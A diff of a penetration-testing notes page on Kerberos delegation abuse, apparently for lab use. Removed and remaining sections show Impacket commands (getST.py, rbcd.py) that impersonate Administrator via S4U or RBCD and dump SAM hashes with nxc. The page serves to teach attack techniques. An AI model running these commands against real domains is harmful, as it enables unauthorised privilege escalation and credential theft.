@@ -5,6 +5,14 @@ description: "Compare the saved unconstrained, constrained, and resource-based d
 keywords: ["kerberos delegation", "unconstrained delegation", "constrained delegation", "rbcd", "s4u", "getst", "msds-allowedtoactonbehalfofotheridentity"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [rbcd.py](/commands/rbcd) · [getST.py](/commands/getst)
@@ -69,77 +77,6 @@ klist
 
 Use a Kerberos-capable client against the matching target hostname and service. A ticket for one SPN is not a universal credential. If an RBCD lab modifies an attribute, record its original value and the exact principal added, verify the resulting state, and restore the intended baseline afterward. A failed request should send you back to identity, SPN, delegation settings, account protections, DNS and time—not immediately to a different guessed payload.
 
-## getST.py: choose the operation and read the result
-
-Request a Kerberos service ticket.
-
-### What the result establishes
-
-Inspect the requested SPN and returned service identity before using the cache with a client.
-
-### Prerequisites and common failures
-
-Ordinary service-ticket requests and S4U impersonation require different rights; delegation configuration and protected-account restrictions can prevent impersonation.
-
-### Example 1: Commands
-
-Run in: **Kali**. Requires the relevant delegation configuration/rights; credentials alone do not grant impersonation.
-
-```bash
-impacket-getST -spn cifs/TARGET_FQDN -impersonate USER_TO_IMPERSONATE -dc-ip DC_IP 'DOMAIN/SERVICE_ACCOUNT:PASSWORD'
-```
-
-### Example 2: Constrained (S4U)
-
-Run in: **Saved lab example**.
-
-```bash
-# You control an account with "allowed to delegate to" a service
-getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
-export KRB5CCNAME=Administrator.ccache
-nxc smb target -k --sam
-```
-
-Saved context: [Kerberos Delegation: Quick Reference — Constrained (S4U)](/active-directory/delegation#constrained-s4u). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Resource-Based (RBCD)
-
-Run in: **Saved lab example**.
-
-```bash
-# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
-getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
-```
-
-Saved context: [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## rbcd.py: choose the operation and read the result
-
-Commands and examples collected from your rbcd.py notes.
-
-### What the result establishes
-
-Read the target computer's allowed-to-act descriptor and resolve the principals it authorizes.
-
-### Prerequisites and common failures
-
-Writing the attribute requires an applicable object right, and the controlled principal must meet the delegation flow's prerequisites.
-
-### Example 1: Resource-Based (RBCD)
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```bash
-# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
-getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
-```
-
-## Existing notes and worked examples
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 Delegation lets a service act on behalf of a user. Misconfigured, it leads straight to impersonation of privileged accounts.
 
 ## Unconstrained
@@ -167,6 +104,5 @@ nxc smb target -k --sam
 rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
 getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
 ```
-
 
 > S4U impersonation of accounts marked "sensitive / cannot be delegated" (or Protected Users) will fail — pick a different admin.
